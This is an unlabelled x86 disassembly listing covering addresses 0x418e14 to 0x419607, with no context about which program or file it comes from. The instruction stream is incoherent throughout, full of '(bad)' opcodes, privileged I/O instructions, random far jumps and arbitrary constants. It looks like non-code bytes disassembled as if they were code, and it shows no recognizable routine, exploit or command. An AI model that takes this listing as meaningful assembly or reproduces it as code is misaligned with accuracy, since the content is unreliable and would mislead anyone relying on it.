  418e14:	mov    ebp,0x93c58674
  418e19:	loopne 0x418de1
  418e1b:	xchg   ebp,eax
  418e1c:	mov    bh,0xca
  418e1e:	jle    0x418e66
  418e20:	ret    0x5d78
  418e23:	push   edi
  418e24:	(bad)  
  418e25:	outs   dx,BYTE PTR ds:[esi]
  418e26:	adc    dl,BYTE PTR [esi+esi*2-0x7f]
  418e2a:	add    eax,0x7aed062
  418e2f:	or     bh,dh
  418e31:	jne    0x418dd0
  418e33:	and    esi,DWORD PTR [ebx+0x4a]
  418e36:	pop    ss
  418e37:	xchg   ecx,eax
  418e38:	push   esi
  418e39:	fs mov al,0x17
  418e3c:	sahf   
  418e3d:	leave  
  418e3e:	jo     0x418e0c
  418e40:	enter  0x9063,0xb6
  418e44:	mov    esp,0x40efe24c
  418e49:	jg     0x418e71
  418e4b:	addr16 pop ebx
  418e4d:	mov    al,ds:0x425afc95
  418e52:	push   ecx
  418e53:	aaa    
  418e54:	mov    ebx,0x2681c93a
  418e59:	dec    edx
  418e5a:	and    ebx,DWORD PTR [eax-0x7396e2ad]
  418e60:	jbe    0x418e6d
  418e62:	popf   
  418e63:	hlt    
  418e64:	add    BYTE PTR [eax],0xcb
  418e67:	sub    BYTE PTR [ebp+0x5d915f11],dl
  418e6d:	outs   dx,DWORD PTR ds:[esi]
  418e6e:	retf   
  418e6f:	ds jns 0x418e8a
  418e72:	mov    eax,0x22eb3c3e
  418e77:	scas   al,BYTE PTR es:[edi]
  418e78:	fwait
  418e79:	add    al,ch
  418e7b:	ret    0x3d7d
  418e7e:	sqrtps xmm2,XMMWORD PTR [esi]
  418e81:	fs test al,0x82
  418e84:	sub    eax,0x8af4f001
  418e89:	mov    bl,BYTE PTR [ecx]
  418e8b:	push   ss
  418e8c:	js     0x418e58
  418e8e:	xchg   ebp,eax
  418e8f:	mov    dl,BYTE PTR [ecx+0x5b1bd8ee]
  418e95:	jg     0x418e98
  418e97:	jg     0x418e94
  418e99:	adc    ch,dl
  418e9b:	and    edx,edx
  418e9d:	cmc    
  418e9e:	mov    ch,0x6c
  418ea0:	add    ebx,DWORD PTR [ecx-0x54]
  418ea3:	outs   dx,BYTE PTR ds:[esi]
  418ea4:	pushf  
  418ea5:	pop    ss
  418ea6:	xlat   BYTE PTR ds:[ebx]
  418ea7:	fstp   QWORD PTR [ebp+ebp*4+0x5c]
  418eab:	or     BYTE PTR [edx+0x417a31a4],dh
  418eb1:	fsubr  st,st(3)
  418eb3:	jns    0x418ecb
  418eb5:	jl     0x418e58
  418eb7:	cmp    BYTE PTR [edx-0x52590e4f],cl
  418ebd:	shr    BYTE PTR [eax-0x5518bc2c],0xad
  418ec4:	in     eax,0x94
  418ec6:	pop    edi
  418ec7:	inc    edi
  418ec8:	cmp    DWORD PTR [edi+ebx*4+0x15],edi
  418ecc:	pop    esi
  418ecd:	push   ecx
  418ece:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ecf:	lea    eax,[ebp-0x53]
  418ed2:	ss jnp 0x418eec
  418ed5:	es stc 
  418ed7:	fcmovne st,st(0)
  418ed9:	xchg   BYTE PTR [esi],dh
  418edb:	and    eax,0xc64cfc78
  418ee0:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  418ee2:	mov    ebx,ds
  418ee4:	daa    
  418ee5:	jp     0x418ecd
  418ee7:	xor    al,0x69
  418ee9:	repnz (bad) 
  418eeb:	xor    eax,0xca639e97
  418ef0:	aas    
  418ef1:	xor    BYTE PTR [ecx],dl
  418ef3:	mov    cl,bl
  418ef5:	stc    
  418ef6:	dec    ebx
  418ef7:	test   eax,0x9041d60a
  418efc:	jmp    0x31df:0x9f9bf101
  418f03:	xchg   esi,esi
  418f05:	mov    eax,ds:0xa52fecc7
  418f0a:	xchg   BYTE PTR [ebx+edx*1+0x6a2ba4b],ch
  418f11:	mov    al,cs:0x5d2541df
  418f17:	xor    ah,BYTE PTR [ecx+0x51fd8dd8]
  418f1d:	lock and eax,0xf8dc7cb9
  418f23:	in     al,dx
  418f24:	into   
  418f25:	outs   dx,BYTE PTR ds:[esi]
  418f26:	arpl   WORD PTR [ebx],di
  418f28:	pop    esp
  418f29:	dec    eax
  418f2a:	daa    
  418f2b:	jle    0x418f89
  418f2d:	add    BYTE PTR [ebp+0xb],al
  418f30:	nop
  418f31:	inc    ebp
  418f32:	adc    eax,0x10cd98a
  418f37:	clc    
  418f38:	push   eax
  418f39:	adc    esp,DWORD PTR [ebx]
  418f3b:	stc    
  418f3c:	mov    ds:0x963b717c,al
  418f41:	mov    dl,BYTE PTR [ebx+edi*2+0x7f]
  418f45:	in     eax,dx
  418f46:	xor    ah,bl
  418f48:	jae    0x418f7c
  418f4a:	loope  0x418f65
  418f4c:	dec    ebp
  418f4d:	fcom   st(3)
  418f4f:	push   ecx
  418f50:	xchg   ebx,eax
  418f51:	pop    DWORD PTR [ecx]
  418f53:	es out dx,eax
  418f55:	mov    ebp,0xc542cc80
  418f5a:	jb     0x418f25
  418f5c:	cdq    
  418f5d:	loop   0x418fc7
  418f5f:	jle    0x418fa1
  418f61:	xchg   BYTE PTR [eax+0x1e9a15ee],cl
  418f67:	je     0x418eed
  418f69:	in     eax,0xc4
  418f6b:	mov    esi,0xad419748
  418f70:	xor    DWORD PTR ds:0x96ffd5ae,0x441b6782
  418f7a:	dec    ebp
  418f7b:	(bad)  
  418f7c:	mov    ecx,0x7347be1a
  418f81:	sar    DWORD PTR [ecx],cl
  418f83:	pmullw mm2,QWORD PTR [ebx]
  418f86:	mov    bl,0x46
  418f88:	leave  
  418f89:	xor    bl,cl
  418f8b:	out    0xdf,al
  418f8d:	cmp    DWORD PTR [ecx-0x43],0xffffffda
  418f91:	call   0x2a360515
  418f96:	fst    DWORD PTR [eax-0x10fba1f5]
  418f9c:	xchg   ebp,eax
  418f9d:	ja     0x418f78
  418f9f:	mov    ah,0xfd
  418fa1:	cli    
  418fa2:	pop    ebp
  418fa3:	pop    edi
  418fa4:	pop    edi
  418fa5:	aam    0x36
  418fa7:	cmp    ebx,DWORD PTR es:[edi-0x3ed525b]
  418fae:	add    ebx,ecx
  418fb0:	(bad)  
  418fb1:	jmp    0x1ebe:0x24baaaa5
  418fb8:	clc    
  418fb9:	test   eax,0xebf865c9
  418fbe:	shl    esi,1
  418fc0:	or     ecx,0xffffffd1
  418fc3:	cmc    
  418fc4:	inc    eax
  418fc5:	fnsave [esi+0x32ce1e03]
  418fcb:	je     0x418fa3
  418fcd:	pop    ss
  418fce:	sbb    bh,al
  418fd0:	retf   
  418fd1:	mov    ds:0xf9e130a1,eax
  418fd6:	dec    esp
  418fd7:	mov    ebx,0x6717adbb
  418fdc:	pop    eax
  418fdd:	add    al,0x5f
  418fdf:	mov    dh,0x1a
  418fe1:	je     0x418f6f
  418fe3:	sub    ebp,DWORD PTR [edi-0x542a55fc]
  418fe9:	sbb    eax,DWORD PTR [edi]
  418feb:	xchg   edi,eax
  418fec:	(bad)
  418ff0:	imul   ecx,DWORD PTR [esi-0x55ef4c33],0xef283ef4
  418ffa:	lea    ebx,[ebp+0x214bcdbe]
  419000:	mov    ebx,0xd6e3de2c
  419005:	dec    esp
  419006:	dec    ebp
  419007:	pop    edx
  419008:	test   eax,0xe835f325
  41900d:	lock adc al,0xf5
  419010:	lahf   
  419011:	div    ch
  419013:	sar    eax,cl
  419015:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419016:	retf   0x6b28
  419019:	mov    dh,0xa0
  41901b:	push   0x37
  41901d:	push   edi
  41901e:	jmp    0x4923:0x657f1be1
  419025:	mov    eax,0x756a31ba
  41902a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41902b:	lea    esp,[ebp+0x1df79472]
  419031:	jno    0x418fec
  419033:	ret    
  419034:	in     al,dx
  419035:	sub    BYTE PTR ds:0x60a4306e,dh
  41903b:	cmp    bh,BYTE PTR [esi+0x60b4d53c]
  419041:	gs pop bp
  419044:	ins    BYTE PTR es:[edi],dx
  419045:	pop    ecx
  419046:	leave  
  419047:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419048:	pop    edi
  419049:	mov    BYTE PTR [ebp+0x4b251b9e],dh
  41904f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419050:	dec    edx
  419051:	ins    DWORD PTR es:[edi],dx
  419052:	pop    eax
  419053:	pop    esp
  419054:	sqrtps xmm2,XMMWORD PTR [esp+edx*1-0x15]
  419059:	sar    ecx,cl
  41905b:	lods   al,BYTE PTR ds:[esi]
  41905c:	jg     0x419041
  41905e:	scas   al,BYTE PTR es:[edi]
  41905f:	mov    bl,0xd3
  419061:	and    bl,cl
  419063:	test   al,0x6c
  419065:	mov    dh,0x65
  419067:	not    esi
  419069:	jo     0x41901c
  41906b:	or     al,0x5a
  41906d:	int3   
  41906e:	and    eax,0xc941830
  419073:	dec    ebx
  419074:	adc    dl,BYTE PTR [esi]
  419076:	or     DWORD PTR ds:0xad9832f7,ecx
  41907c:	cmp    bl,BYTE PTR [eax]
  41907e:	les    edx,FWORD PTR [ecx]
  419080:	and    dh,ah
  419082:	lds    eax,FWORD PTR ss:[edi+ebx*4]
  419086:	inc    eax
  419087:	popa   
  419088:	and    DWORD PTR [ebp+0x2e],ebp
  41908b:	add    DWORD PTR [ebp+edx*1-0x75],esi
  41908f:	jg     0x41908a
  419091:	punpckhbw mm1,QWORD PTR [ecx+0x4b]
  419095:	call   0x960902f8
  41909a:	push   ecx
  41909b:	inc    ecx
  41909c:	xor    BYTE PTR [edx+0x79],cl
  41909f:	push   esp
  4190a0:	cmp    esi,edi
  4190a2:	out    dx,eax
  4190a3:	out    0xf1,al
  4190a5:	(bad)  
  4190a6:	xchg   ecx,eax
  4190a7:	sub    eax,0xbe865e96
  4190ac:	sbb    eax,0xb54128f6
  4190b1:	push   0x1ad9ede7
  4190b6:	mov    ds:0x957e663d,eax
  4190bb:	mov    edx,0x25a52001
  4190c0:	adc    BYTE PTR [edx+0x2f],dh
  4190c3:	(bad)  
  4190c5:	lea    eax,[eax+esi*4+0x67da731f]
  4190cc:	jo     0x419083
  4190ce:	xchg   ecx,eax
  4190cf:	sahf   
  4190d0:	jns    0x419055
  4190d2:	pop    esp
  4190d3:	mov    ebp,0xc5fbae51
  4190d8:	sbb    BYTE PTR [edi],bl
  4190da:	pop    ss
  4190db:	push   0x6511d131
  4190e0:	les    ebx,FWORD PTR [ecx]
  4190e2:	add    BYTE PTR [esi+0x2d],bl
  4190e5:	adc    DWORD PTR [eax],ecx
  4190e7:	dec    BYTE PTR [eax]
  4190e9:	sbb    eax,0xab5d7cf2
  4190ee:	lods   al,BYTE PTR ds:[esi]
  4190ef:	dec    edx
  4190f0:	and    al,BYTE PTR [edx+0x3e]
  4190f3:	inc    ecx
  4190f4:	jae    0x419162
  4190f6:	add    BYTE PTR [edi+0x7d],al
  4190f9:	push   edx
  4190fa:	jmp    ebp
  4190fc:	test   al,0x2a
  4190fe:	mov    cl,0xdb
  419100:	je     0x419127
  419102:	mov    al,ds:0xe6f808c2
  419107:	jo     0x41909b
  419109:	pop    esi
  41910a:	test   BYTE PTR [eax+0x7723b873],ch
  419110:	pop    esp
  419111:	imul   esi,DWORD PTR [edi-0x2d],0x1
  419115:	les    esp,FWORD PTR ds:0x645b2a23
  41911b:	mov    ebx,0x8bf45a2f
  419120:	mov    esp,0x4e0eba69
  419125:	add    eax,0x3298a11a
  41912a:	mov    ah,BYTE PTR [esi+0x6f]
  41912d:	je     0x41915a
  41912f:	pop    edi
  419130:	xor    DWORD PTR [esi+eiz*4+0x20],edx
  419134:	pop    ss
  419135:	mov    bh,BYTE PTR ds:0xb3bed744
  41913b:	add    bh,BYTE PTR [edi-0xc4cd780]
  419141:	adc    esi,ebx
  419143:	inc    edi
  419144:	call   0xddf9548
  419149:	inc    esp
  41914a:	sub    BYTE PTR [ebx],ch
  41914c:	data16 mov bl,0x44
  41914f:	jmp    0x41912d
  419151:	dec    ebp
  419152:	sub    eax,0x6becdef2
  419157:	add    BYTE PTR [ecx],dl
  419159:	sti    
  41915a:	out    0x16,eax
  41915c:	imul   ecx,DWORD PTR [edx-0x70],0x9e064c0a
  419163:	mov    dl,0x67
  419165:	pop    ss
  419166:	mov    ?,edi
  419168:	cmp    DWORD PTR [ebp+0x294859e],edi
  41916e:	pushf  
  41916f:	jae    0x419161
  419171:	add    BYTE PTR [eax+0x72],ch
  419174:	sbb    al,0xb6
  419176:	ds rcr ebp,0x4a
  41917a:	push   es
  41917b:	bound  edi,QWORD PTR [eax+0x67918b5a]
  419181:	push   ebx
  419182:	sti    
  419183:	add    ecx,edx
  419185:	adc    BYTE PTR [ecx+0x26],cl
  419188:	mov    eax,0xa335bbb9
  41918d:	ror    esi,cl
  41918f:	into   
  419190:	call   0xdc1dc854
  419195:	shl    esp,1
  419197:	adc    DWORD PTR [edi],ebp
  419199:	jb     0x4191a8
  41919b:	call   0xd5dd:0x864a6dfd
  4191a2:	jne    0x419190
  4191a4:	dec    esi
  4191a5:	cmp    ah,BYTE PTR [eax]
  4191a7:	push   es
  4191a8:	and    eax,0xb559e7fd
  4191ad:	in     al,0x22
  4191af:	imul   DWORD PTR [eax-0x50]
  4191b2:	retf   0x4656
  4191b5:	lds    eax,FWORD PTR [esi]
  4191b7:	cwde   
  4191b8:	push   esp
  4191b9:	mov    WORD PTR [eax-0x1],gs
  4191bc:	mov    ebp,0xaab47ab0
  4191c1:	or     BYTE PTR [ebp+0x13e46b09],bl
  4191c7:	mov    eax,ds:0x6172e177
  4191cc:	jecxz  0x419188
  4191ce:	cmp    esp,DWORD PTR [ecx+0x784a022c]
  4191d4:	mov    DWORD PTR [edx+esi*1],eax
  4191d7:	jg     0x4191b2
  4191d9:	les    ebp,FWORD PTR [edx+eiz*4]
  4191dc:	fsub   QWORD PTR ds:0xbb40a686
  4191e2:	fcmove st,st(5)
  4191e4:	cs outs dx,DWORD PTR ds:[esi]
  4191e7:	sahf   
  4191e8:	xor    edi,edi
  4191ea:	popf   
  4191eb:	(bad)  
  4191ec:	mov    esp,0x83f8aa76
  4191f1:	cmp    eax,0xe5227e04
  4191f6:	xlat   BYTE PTR ds:[ebx]
  4191f7:	xchg   esp,eax
  4191f8:	add    BYTE PTR [ecx-0x64],bl
  4191fb:	pop    es
  4191fc:	ja     0x41919a
  4191fe:	outs   dx,BYTE PTR ds:[esi]
  4191ff:	mov    bh,bl
  419201:	fisubr WORD PTR [ecx-0x52eaf286]
  419207:	dec    eax
  419208:	andps  xmm2,xmm1
  41920b:	(bad)  
  41920c:	stos   DWORD PTR es:[edi],eax
  41920d:	inc    ecx
  41920e:	das    
  41920f:	mov    esi,DWORD PTR [ebp+0x27]
  419212:	adc    DWORD PTR [edx+0x4f9009f],edx
  419218:	fimul  DWORD PTR [edi+0x28]
  41921b:	jl     0x4191f1
  41921d:	test   eax,0x205b4ad0
  419222:	ins    DWORD PTR es:[edi],dx
  419223:	adc    ecx,ecx
  419225:	popa   
  419226:	mov    ds:0x3ddb80ac,eax
  41922b:	shl    DWORD PTR [ecx+eiz*1-0x50],1
  41922f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419230:	push   edx
  419231:	inc    di
  419233:	sub    BYTE PTR [edi],ah
  419235:	lods   eax,DWORD PTR ds:[esi]
  419236:	cmp    eax,0x3c3c40bc
  41923b:	std    
  41923c:	retf   
  41923d:	popa   
  41923e:	adc    eax,0xc70e1bb0
  419243:	xor    BYTE PTR ds:0x17b120d7,0xd3
  41924a:	mov    edi,0xc25129b7
  41924f:	pop    ebp
  419250:	push   es
  419251:	lea    ebx,[ecx]
  419253:	gs fcmovnu st,st(3)
  419256:	ja     0x419275
  419258:	pop    edi
  419259:	es or  al,0x5a
  41925c:	and    al,0xc2
  41925e:	xchg   edi,eax
  41925f:	jg     0x4192a3
  419261:	fsubr  st,st(7)
  419263:	mov    al,0x19
  419265:	imul   ebp,esi,0xfffffff1
  419268:	sbb    esi,DWORD PTR [edx]
  41926a:	dec    edx
  41926b:	mov    dl,0xce
  41926d:	push   0x2b
  41926f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419270:	inc    ebp
  419271:	jecxz  0x4191f9
  419273:	and    eax,0xb52bff5a
  419278:	popf   
  419279:	xor    eax,0xd2da5182
  41927e:	mov    WORD PTR [eax+0x8642e9a],fs
  419284:	adc    ah,al
  419286:	imul   edx,DWORD PTR [eax-0x62],0xce82000b
  41928d:	data16 mov al,ds:0xd5bb517e
  419293:	xchg   esi,eax
  419294:	pop    ds
  419295:	mov    edx,0x48cf63c5
  41929a:	addr16 mov ebp,0x8b3a829a
  4192a0:	inc    esi
  4192a1:	sbb    edx,DWORD PTR [edi-0x4f]
  4192a4:	pop    edx
  4192a5:	cld    
  4192a6:	nop
  4192a7:	xor    ah,BYTE PTR [edi-0x4598208b]
  4192ad:	call   0x58f0f325
  4192b2:	pop    ebx
  4192b3:	test   DWORD PTR ds:0x2958da,ebp
  4192b9:	mov    edx,0x830d19aa
  4192be:	imul   esi,edx,0xe6ecbc6c
  4192c4:	xor    ebx,DWORD PTR [esi-0x24e2168e]
  4192ca:	and    eax,0xbed85b19
  4192cf:	scas   al,BYTE PTR es:[edi]
  4192d0:	and    DWORD PTR gs:[edi],ebp
  4192d3:	inc    ebp
  4192d4:	nop
  4192d5:	fiadd  DWORD PTR [esi]
  4192d7:	mov    esi,DWORD PTR [ebx]
  4192d9:	daa    
  4192da:	jns    0x4192a6
  4192dc:	out    dx,al
  4192dd:	scas   eax,DWORD PTR es:[edi]
  4192de:	push   esi
  4192df:	mov    ch,0x28
  4192e1:	rol    BYTE PTR [ebp+0x4b1949d0],0xf5
  4192e8:	mov    WORD PTR [edx],gs
  4192ea:	or     BYTE PTR [ebx],0xd1
  4192ed:	lods   eax,DWORD PTR ds:[esi]
  4192ee:	lahf   
  4192ef:	pop    ss
  4192f0:	mov    edx,0xd1d4e786
  4192f5:	shr    BYTE PTR [eax],1
  4192f7:	idiv   DWORD PTR [ebx+eax*4-0x61379e76]
  4192fe:	jbe    0x4192b2
  419300:	outs   dx,DWORD PTR ds:[esi]
  419301:	pop    esp
  419302:	or     BYTE PTR [esi+0x3e58819c],cl
  419308:	mov    dh,0xae
  41930a:	cmp    BYTE PTR [esi+edi*4-0x62],bh
  41930e:	pop    esp
  41930f:	loop   0x41934b
  419311:	jnp    0x4192fb
  419313:	fcom   DWORD PTR [ebp+0x48]
  419316:	mov    edi,0x72f00d0f
  41931b:	inc    esp
  41931c:	fcomp  DWORD PTR [edi+0x67]
  41931f:	es xchg edx,eax
  419321:	inc    ecx
  419322:	mov    bh,0x5d
  419324:	scas   eax,DWORD PTR es:[edi]
  419325:	pusha  
  419326:	add    DWORD PTR [eax+ecx*4+0x35],esp
  41932a:	sbb    eax,0x1c5193c7
  41932f:	in     eax,0x7b
  419331:	cdq    
  419332:	test   BYTE PTR [ebp+eax*8-0x275467f3],bh
  419339:	jbe    0x4192ed
  41933b:	in     eax,0xe3
  41933d:	mov    ds:0xff9f88b9,eax
  419342:	jne    0x419365
  419344:	mov    esi,0x365c1623
  419349:	push   0x17
  41934b:	cdq    
  41934c:	push   edi
  41934d:	scas   al,BYTE PTR es:[edi]
  41934e:	data16 es ds or ch,al
  419353:	shr    DWORD PTR [eax],1
  419355:	cmp    DWORD PTR [eax-0x8c7e9bd],edx
  41935b:	and    ecx,DWORD PTR ds:0x6ee2d715
  419361:	(bad)  
  419362:	dec    ebx
  419363:	jnp    0x4192ed
  419365:	shr    al,1
  419367:	pop    ds
  419368:	mov    ebx,0x5e0e367e
  41936d:	jg     0x419340
  41936f:	mov    ch,0xf8
  419371:	mov    ebx,0x840bdad6
  419376:	sbb    ecx,DWORD PTR ds:0x720fa7fb
  41937c:	mov    ch,0x28
  41937e:	sub    ebx,DWORD PTR [edx+0x150c1051]
  419384:	fist   WORD PTR [esi-0x70]
  419387:	push   ebx
  419388:	outs   dx,DWORD PTR ds:[esi]
  419389:	inc    ebp
  41938a:	mov    al,ds:0xea43d45
  41938f:	out    dx,eax
  419390:	(bad)  [edi+0x5d6e5e12]
  419396:	add    dl,dl
  419398:	xchg   BYTE PTR [ecx+0x6005b4b0],dh
  41939e:	push   esi
  41939f:	mov    al,ds:0x65c83515
  4193a4:	push   cs
  4193a5:	dec    ecx
  4193a6:	jnp    0x419391
  4193a8:	stc    
  4193a9:	lock stos BYTE PTR es:[edi],al
  4193ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193ac:	cmc    
  4193ad:	mov    esi,0xa01ca973
  4193b2:	add    ebp,edi
  4193b4:	add    cl,bh
  4193b6:	loop   0x4193fe
  4193b8:	les    ecx,FWORD PTR [esi-0x66]
  4193bb:	imul   esp,DWORD PTR [eax],0x4666a468
  4193c1:	inc    ebp
  4193c2:	fldenv [ebx]
  4193c4:	inc    edx
  4193c5:	and    bl,0x8
  4193c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c9:	jne    0x419392
  4193cb:	dec    eax
  4193cc:	mov    WORD PTR ds:0xf32d8a64,?
  4193d2:	lock clc 
  4193d4:	sbb    ah,BYTE PTR [edx-0x49098637]
  4193da:	jmp    0x6ae5a5a8
  4193df:	fnsave [ebx]
  4193e1:	mov    eax,0x7b3e2bb1
  4193e6:	fucomip st,st(2)
  4193e8:	in     al,0x29
  4193ea:	test   eax,0xd38d862c
  4193ef:	popa   
  4193f0:	push   ss
  4193f1:	pop    eax
  4193f2:	mov    ds:0xce4427ab,al
  4193f7:	jmp    0x37dc:0x8e3f51ba
  4193fe:	and    eax,0x97f9c23c
  419403:	xchg   ebp,eax
  419404:	jo     0x4193bc
  419406:	fwait
  419407:	mov    al,ds:0xbcc2b26a
  41940c:	cmp    esp,DWORD PTR [eax]
  41940e:	(bad)  
  41940f:	sub    al,0xe0
  419411:	mov    ebx,0x20cb342
  419416:	mov    dl,0xa
  419418:	pop    ecx
  419419:	dec    eax
  41941a:	in     al,0x47
  41941c:	test   BYTE PTR [ebx+0x6d],dh
  41941f:	ins    DWORD PTR es:[edi],dx
  419420:	dec    ebx
  419421:	pop    edx
  419422:	xchg   esp,eax
  419423:	xchg   edi,eax
  419424:	ret    
  419425:	add    BYTE PTR [ecx+0x45c6efec],0xad
  41942c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41942d:	mov    BYTE PTR ds:0x399f7e7b,dl
  419433:	popa   
  419434:	inc    eax
  419435:	jle    0x4193d8
  419437:	outs   dx,BYTE PTR ds:[esi]
  419438:	pop    edi
  419439:	sbb    eax,0x8d2dc2ef
  41943e:	cmp    BYTE PTR [ecx+0x4f],dl
  419441:	ins    BYTE PTR es:[edi],dx
  419442:	in     eax,0xab
  419444:	out    dx,eax
  419445:	mov    bh,BYTE PTR [edx-0x12]
  419448:	aam    0xa0
  41944a:	iret   
  41944b:	xchg   ebx,eax
  41944c:	rcr    BYTE PTR [eax-0x16],1
  41944f:	mov    ds:0xff89d93c,eax
  419454:	mov    ds:0xef666d26,al
  419459:	xchg   edi,eax
  41945a:	mov    esi,0x910dd83e
  41945f:	les    esp,FWORD PTR [esi+0x3156549]
  419465:	mov    ebp,0xe851900e
  41946a:	sub    eax,0x8652bfeb
  41946f:	push   ecx
  419470:	icebp  
  419471:	inc    eax
  419472:	rcr    eax,1
  419474:	imul   esp,DWORD PTR ds:[ecx],0xffffffb3
  419478:	rcr    edi,cl
  41947a:	xor    ecx,DWORD PTR [esi]
  41947c:	add    edi,DWORD PTR [esi-0x3ec87a23]
  419482:	lds    edi,FWORD PTR [edi-0x2d33d86e]
  419488:	or     dl,BYTE PTR ds:0xce08aefd
  41948e:	xor    al,bl
  419490:	and    BYTE PTR [esi],cl
  419492:	cmp    ebp,edx
  419494:	jle    0x419492
  419496:	adc    al,0x64
  419498:	gs pop eax
  41949a:	into   
  41949b:	test   al,0xb2
  41949d:	fld    DWORD PTR [ebp+0xd2c47ec]
  4194a3:	add    ecx,DWORD PTR [ecx]
  4194a5:	bound  ecx,QWORD PTR [esi-0x77fc716b]
  4194ab:	ins    DWORD PTR es:[edi],dx
  4194ac:	pop    ss
  4194ad:	cmp    eax,DWORD PTR [eax]
  4194af:	out    dx,eax
  4194b0:	cwde   
  4194b1:	push   cs
  4194b2:	xchg   BYTE PTR [ecx+0x7c25c040],dh
  4194b8:	and    edx,DWORD PTR [ecx]
  4194ba:	in     eax,0x87
  4194bc:	outs   dx,BYTE PTR ds:[esi]
  4194bd:	jns    0x41949a
  4194bf:	cmp    BYTE PTR [ecx-0x25],cl
  4194c2:	into   
  4194c3:	xchg   ebp,eax
  4194c4:	cmovle edx,DWORD PTR [esi]
  4194c7:	jns    0x41948b
  4194c9:	inc    esi
  4194ca:	or     ebx,DWORD PTR [esi]
  4194cc:	mov    bl,0x9e
  4194ce:	mov    al,ds:0xd1c7641f
  4194d3:	clc    
  4194d4:	push   ecx
  4194d5:	push   0xffffffcd
  4194d7:	jl     0x4194e7
  4194d9:	pop    edi
  4194da:	in     eax,0x57
  4194dc:	iret   
  4194dd:	sbb    BYTE PTR ds:0xe8933b6e,ah
  4194e3:	mov    edx,es
  4194e5:	sar    BYTE PTR [eax],1
  4194e7:	push   0xeb79dbc6
  4194ec:	aaa    
  4194ed:	and    BYTE PTR [edi],bl
  4194ef:	jge    0x419491
  4194f1:	fbstp  TBYTE PTR [eax-0x53]
  4194f4:	stc    
  4194f5:	fist   DWORD PTR [esi+edi*8]
  4194f8:	xor    eax,DWORD PTR [edi]
  4194fa:	jmp    0x2edf9a20
  4194ff:	mov    ds:0x33cd4172,eax
  419504:	sbb    DWORD PTR [edi],esi
  419506:	inc    esp
  419507:	cdq    
  419508:	test   DWORD PTR [esp+eax*8],edx
  41950b:	jmp    0xe4ac:0x25fbeca0
  419512:	inc    ebx
  419513:	xchg   BYTE PTR [ebx+0x56],dl
  419516:	cli    
  419517:	gs xor al,0x95
  41951a:	adc    DWORD PTR [esi-0x6fe729eb],ebp
  419520:	sahf   
  419521:	imul   esi,ebp,0xffffffd8
  419524:	sbb    DWORD PTR [edi],esi
  419526:	(bad)  [edx+0x540c3f69]
  41952c:	loop   0x4194af
  41952e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41952f:	test   al,0xf
  419531:	cmp    DWORD PTR [edx-0x786cd13e],edx
  419537:	(bad)  
  419539:	pop    ds
  41953a:	sub    dl,BYTE PTR [eax-0x268ce038]
  419540:	pop    ss
  419541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419542:	aaa    
  419543:	push   es
  419544:	rcl    BYTE PTR [ecx],cl
  419546:	xchg   edi,eax
  419547:	jo     0x4194e5
  419549:	rcl    DWORD PTR [ebx+0x41],0x7b
  41954d:	sbb    DWORD PTR [edx-0x364c834b],edx
  419553:	fwait
  419554:	js     0x4194e9
  419556:	add    ch,BYTE PTR [ebp-0x45]
  419559:	jmp    0x419594
  41955b:	popf   
  41955c:	pop    ebx
  41955d:	add    DWORD PTR [ecx+edi*1-0x50],ebp
  419561:	jne    0x419531
  419563:	repnz mov ds:0xd4aacb91,al
  419569:	inc    edx
  41956a:	lods   eax,DWORD PTR ds:[esi]
  41956b:	les    ebp,FWORD PTR [edx]
  41956d:	inc    eax
  41956e:	mov    gs,WORD PTR [esi-0x7081c10]
  419574:	add    DWORD PTR [eax],esp
  419576:	pop    edi
  419577:	ds push edi
  419579:	fdivr  DWORD PTR [eax+eax*4]
  41957c:	lock test eax,0x746c6571
  419582:	sbb    ebx,DWORD PTR [esi+ebx*4+0x54]
  419586:	shl    DWORD PTR [edi-0x41a81f33],1
  41958c:	xor    dh,BYTE PTR [ecx]
  41958e:	out    dx,al
  41958f:	sub    eax,0xe201cd47
  419594:	xchg   edi,eax
  419595:	fwait
  419596:	push   edx
  419597:	arpl   WORD PTR [eax+0x5c],sp
  41959a:	fistp  WORD PTR [edi]
  41959c:	in     al,0x38
  41959e:	not    ah
  4195a0:	sub    BYTE PTR [ebx],bh
  4195a2:	lods   eax,DWORD PTR ds:[esi]
  4195a3:	loope  0x419525
  4195a5:	inc    esi
  4195a6:	clc    
  4195a7:	iret   
  4195a8:	cdq    
  4195a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195aa:	push   0xa3cae249
  4195af:	and    BYTE PTR [ebx+edi*2-0x71],bl
  4195b3:	xlat   BYTE PTR ds:[ebx]
  4195b4:	ret    0x11c2
  4195b7:	je     0x419594
  4195b9:	scas   eax,DWORD PTR es:[edi]
  4195ba:	push   esi
  4195bb:	add    al,0xb6
  4195bd:	xor    edi,ecx
  4195bf:	dec    ebp
  4195c0:	jb     0x41956c
  4195c2:	sahf   
  4195c3:	and    bl,BYTE PTR [esi+esi*1-0x527e867a]
  4195ca:	mov    ebp,0xf0b5488a
  4195cf:	pop    esi
  4195d0:	dec    eax
  4195d1:	outs   dx,BYTE PTR ds:[esi]
  4195d2:	mov    ebx,0x93f997df
  4195d7:	pop    ss
  4195d8:	jle    0x4195f0
  4195da:	sbb    BYTE PTR [edx-0x3f4d53e8],bh
  4195e0:	pop    es
  4195e1:	mov    ss,WORD PTR [eax+0x16]
  4195e4:	xchg   ebp,eax
  4195e5:	cmp    al,0xa2
  4195e7:	push   edx
  4195e8:	(bad)  
  4195e9:	sub    ebp,DWORD PTR [eax+0x43]
  4195ec:	mov    ebp,edx
  4195ee:	add    al,0x4f
  4195f0:	pop    ecx
  4195f1:	jae    0x41963d
  4195f3:	add    al,0xc
  4195f5:	mov    ds:0x33cce139,eax
  4195fa:	mov    eax,0x54572031
  4195ff:	add    eax,0x3967b8f9
  419604:	shr    ecx,0xd1
  419607:	xor    BYTE PTR [edi-0x4e],0x1d
